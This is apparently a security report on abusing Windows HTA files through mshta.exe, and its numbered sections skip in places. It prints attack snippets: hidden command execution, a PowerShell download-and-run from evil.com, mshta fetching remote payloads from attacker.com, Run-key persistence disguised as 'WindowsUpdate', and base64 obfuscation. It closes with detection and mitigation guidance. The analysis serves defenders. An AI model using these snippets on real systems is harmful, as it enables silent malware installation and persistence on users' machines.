EXECUTIVE SUMMARY
================================================================================

HTA (HTML Application) files are a Windows-specific technology that can execute
arbitrary code with minimal or no user interaction when executed via mshta.exe.
This report evaluates HTA execution capabilities, silent execution potential,
and security implications.

KEY FINDINGS:
- mshta.exe enables completely silent execution without user prompts
- ActiveX/COM access provides system-level capabilities
- Registry and file system can be modified without user knowledge
- Only viable on Windows via mshta.exe (not in modern browsers)
- Represents significant security risk for malware delivery


TECHNICAL OVERVIEW
================================================================================

1. HTA EXECUTION MECHANISMS

   1.1 mshta.exe (HTML Application Host)
       - Native Windows executable for HTA file execution
       - Location: %WinDir%\System32\mshta.exe
       - Inherits user privileges at execution time
       - No security warnings by default
       - Can be launched silently with window state control

   1.2 File Association
       - .hta files associated with mshta.exe by default
       - Double-clicking .hta file launches mshta.exe
       - No browser security context (full system access)

   1.3 Command Line Execution
       Examples:
       - mshta.exe script.hta
       - mshta.exe "https://attacker.com/payload.hta"
       - mshta.exe vbscript:Execute(code)


2. ACTIVEX/COM OBJECT ACCESS

   When running via mshta.exe, HTA files have access to:

   2.1 WScript.Shell
       Purpose: Execute commands, access registry, environment
       Access Level: Full (user context)
       Silent Capability: Yes (window state 0)

       Available Methods:
       - Exec() - Execute command and capture output
       - Run() - Execute command with window state control (0=hidden)
       - RegRead() - Read registry values
       - RegWrite() - Write registry values
       - RegDelete() - Delete registry values
       - CreateShortcut() - Create shortcuts (LNK files)
       - SendKeys() - Simulate keyboard input

       Example Silent Execution:
       var shell = new ActiveXObject("WScript.Shell");
       shell.Run("cmd.exe /c payload.exe", 0, false);  // 0=hidden, false=async

   2.2 FileSystemObject (FSO)
       Purpose: File and directory operations
       Access Level: Full (within user permissions)
       Silent Capability: Yes (all operations silent)

       Available Methods:
       - CreateTextFile() - Create and write files
       - CopyFile() - Copy files
       - MoveFile() - Move files
       - DeleteFile() - Delete files
       - CreateFolder() - Create directories
       - GetSpecialFolder() - Access system folders (Temp, Desktop, etc.)
       - BuildPath() - Construct file paths

       Accessible Folders:
       - Temp folder (%TEMP%)
       - User profile (%USERPROFILE%)
       - Desktop, Documents, Downloads
       - StartUp folder (for persistence)

   2.3 WbemScripting.SWbemLocator (WMI)
       Purpose: Windows Management Instrumentation access
       Access Level: Full (user context)
       Silent Capability: Yes

       Capabilities:
       - Process creation/termination
       - Service management
       - Event subscription (advanced persistence)
       - Registry access via WMI classes
       - System monitoring


3. SILENT EXECUTION CHARACTERISTICS

   3.1 Window State Control

       HTA:APPLICATION Tag Parameters:
       - WINDOWSTATE="normal"     - Visible in taskbar
       - WINDOWSTATE="minimize"   - Minimized
       - WINDOWSTATE="maximize"   - Maximized
       - SHOWINTASKBAR="no"       - Hidden from taskbar
       - CAPTION="no"             - No title bar
       - BORDER="none"            - No window border

       Shell.Run() Window Styles:
       - 0 = Hidden (vbHide)
       - 1 = Normal (vbNormalFocus)
       - 2 = Minimized (vbMinimizedFocus)
       - 3 = Maximized (vbMaximizedFocus)
       - 4 = Normal without focus (vbNormalNoFocus)
       - 5 = Minimized without focus (vbMinimizedNoFocus)

   3.2 User Prompts Analysis

       When are prompts shown?

       Scenario 1: First-time HTA execution in IE/edge with ActiveX disabled
       - Prompt: "Internet Explorer has blocked this page from running scripts"
       - Can be bypassed: User enables script execution
       - In mshta.exe: No prompt (direct execution)

       Scenario 2: UAC elevation required
       - Prompt: "User Account Control" dialog
       - Bypassed if: mshta.exe already running as admin
       - Bypass method: ShellExecute with "runas" verb (shows UAC once)

       Scenario 3: Script debugging error
       - Prompt: "Script error" dialog
       - Bypassed: With error suppression (onerror="return true")

       Scenario 4: Normal execution via mshta.exe
       - No prompts at all (unless parent process is UAC-elevated)
       - Complete silent execution possible

5. SILENT EXECUTION FLOW ANALYSIS

   5.1 Typical Attack Chain

       Step 1: Delivery
       - User receives .hta file via email, download, or link
       - File double-clicked or opened with mshta.exe

       Step 2: Execution
       - mshta.exe launches with user's privileges
       - HTA:APPLICATION tag parsed (no UI shown if WINDOWSTATE=minimize)
       - JavaScript/VBScript code executes immediately

       Step 3: Payload Delivery
       - HTA downloads additional malware
       - Creates persistence mechanism silently
       - Executes payload without any visible window
       - All operations complete in seconds

       Step 4: Persistence
       - Registry entry added to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
       - Scheduled task created via WMI
       - Startup folder modified
       - Next reboot/login: malware runs automatically

       Step 5: Completion
       - HTA window closes silently
       - User sees nothing unusual
       - Malware persists and continues execution

   5.2 Command Execution Example

       // Hide console window - no output visible
       var shell = new ActiveXObject("WScript.Shell");
       shell.Run("cmd.exe /c C:\\malware.exe", 0, false);

       // PowerShell with no profile
       var ps = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command";
       shell.Run(ps + ' "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/\')\"', 0, false);

       // Async execution (doesn't wait)
       shell.Run("mshta.exe https://attacker.com/payload2.hta", 0, false);

   5.3 Registry Persistence Example

       var shell = new ActiveXObject("WScript.Shell");
       var runKey = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";

       // Add malware to startup
       shell.RegWrite(runKey + "WindowsUpdate", "C:\\malware.exe", "REG_SZ");

       // Result: Malware runs every login without user knowledge

7. SECURITY BYPASS TECHNIQUES

   7.1 UAC Bypass via mshta.exe
       - If mshta.exe is in admin folder with "Auto-Elevate" capability
       - Some versions bypass UAC silently
       - Creates elevated process without UAC prompt
       - Mitigation: Windows updates, UAC enforcement

       Detection: Monitor for mshta.exe elevation attempts

   7.2 Code Obfuscation
       - JavaScript/VBScript can be heavily obfuscated
       - Base64 encoding of payloads
       - String concatenation and eval()
       - Encoding detects by antivirus

       Example:
       eval(atob("dmFyIHNoZWxsID0gbmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTs="));

   7.3 Legitimate Tool Abuse (Living-off-the-Land)
       - Uses built-in Windows tools only
       - No external malware required
       - Harder to detect: cmd.exe, powershell.exe, wmic.exe
       - mshta.exe itself is legitimate


8. PERSISTENCE MECHANISMS VIA HTA

   8.1 Registry Run Keys
       Path: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
       Advantage: Runs at every user login
       Stealth: Can be set with non-obvious names
       Cleanup: User needs Registry knowledge to remove

       var shell = new ActiveXObject("WScript.Shell");
       shell.RegWrite(regPath + "WindowsDefender", "mshta.exe http://evil.com/update.hta");

   8.2 Scheduled Tasks
       Method: WMI via PowerShell
       Trigger: At logon, at startup, or recurring interval
       Advantage: More resilient than registry keys
       Detection: Requires task scheduler inspection

       var shell = new ActiveXObject("WScript.Shell");
       var psCmd = 'powershell -Command "Register-ScheduledTask -TaskName Updater..."';
       shell.Run(psCmd, 0, true);

   8.3 Startup Folder Modification
       Path: C:\Users\[User]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
       Advantage: Simple, visible but often missed
       Detection: User can see .lnk file in startup folder
       Cleanup: Delete from startup folder

       var fso = new ActiveXObject("Scripting.FileSystemObject");
       var startupPath = shell.SpecialFolders("StartUp");
       // Create shortcut or VBS file in startup folder

   8.4 WMI Event Subscription (Advanced)
       Method: Create WMI event that triggers on system events
       Advantage: Very difficult to detect
       Trigger: System startup, user logon, process creation
       Cleanup: Requires WMI knowledge to remove

       Requires: Administrator privileges

   8.5 Services Installation
       Method: Create Windows service via ServiceController
       Advantage: Loads at system startup before user login
       Detection: Requires service inspection tools
       Cleanup: Service removal via Services.msc or SC.exe

       Requires: Administrator/SYSTEM privileges


9. DETECTION & MITIGATION STRATEGIES

   9.1 Detection Methods

       File-based Detection:
       - Monitor for .hta file creation/execution
       - Scan email attachments for .hta files
       - Watch for mshta.exe process creation
       - Monitor parent process of mshta.exe (browser, file explorer, etc.)

       Behavior-based Detection:
       - mshta.exe accessing registry (HKLM/HKCU Run keys)
       - Unexpected mshta.exe with network access
       - mshta.exe spawning child processes (cmd.exe, powershell.exe)
       - Multiple mshta.exe instances in short time
       - mshta.exe with unusual command-line arguments

       Log-based Detection:
       - Windows Event Log: Process Creation (Event 1 in Sysmon)
       - Sysmon: File created (Event 11) in startup folders
       - Registry events: HKCU\Run modifications
       - Task Scheduler: New scheduled task creation
       - Windows Defender: Quarantine logs

       EDR Indicators:
       - Process:mshta.exe -> RegSetValueEx (Run key)
       - Process:mshta.exe -> CreateProcessA (cmd.exe, powershell.exe)
       - Process:mshta.exe -> File creation in %TEMP%
       - Process:mshta.exe -> Network connection without user interaction

   9.2 Mitigation Strategies

       User Education:
       - Don't open .hta files from untrusted sources
       - Be suspicious of .hta files attached to emails
       - Report .hta file attachments to IT security
       - Use email filtering to block .hta files

       Technical Controls:
       - Disable .hta file association (remove mshta.exe handler)
       - Use AppLocker to restrict mshta.exe execution
       - Implement WDAC (Windows Defender Application Control) policies
       - Disable ActiveX in Internet Explorer
       - Remove IE11 if not needed (Edge is standard now)

       Preventive Controls:
       - Restrict script execution policies (Execution Policy setting)
       - Disable WScript.Shell COM object access for non-admin users
       - Monitor and alert on registry Run key modifications
       - Implement file integrity monitoring on startup folders
       - Disable scheduled task creation for non-admin users
       - Remove file association for .hta files

       Detective Controls:
       - EDR/XDR system with behavioral analytics
       - Registry monitoring and alerting
       - Process monitoring (Sysmon, native Windows logs)
       - File integrity monitoring on critical directories
       - Network monitoring for outbound connections from mshta.exe

       Response Controls:
       - Automated termination of suspicious mshta.exe processes
       - Automatic removal of suspicious registry entries
       - Isolation of infected systems
       - Forensic analysis of HTA files and execution
       - Restoration from clean backups

15. CONCLUSION

    HTA files represent a significant security risk on Windows systems because:

    ✗ Complete silent execution without user interaction
    ✗ Unrestricted access to system resources (registry, files, WMI)
    ✗ Can establish persistence mechanisms invisibly
    ✗ Minimal/no user warnings by design
    ✗ Uses legitimate Windows components (difficult to detect)
    ✗ Works even if antivirus is present (if bypassed)
    ✗ Can chain to additional malware payloads

    Modern browsers are NOT vulnerable to HTA attacks:
    ✓ No ActiveX/COM support
    ✓ Sandboxed execution environment
    ✓ Cannot access registry or system files
    ✓ Cannot execute system commands
    ✓ Restricted network access

    The primary vector remains mshta.exe on Windows systems.
    Organizations should implement comprehensive controls to restrict
    HTA execution and monitor for suspicious activity.
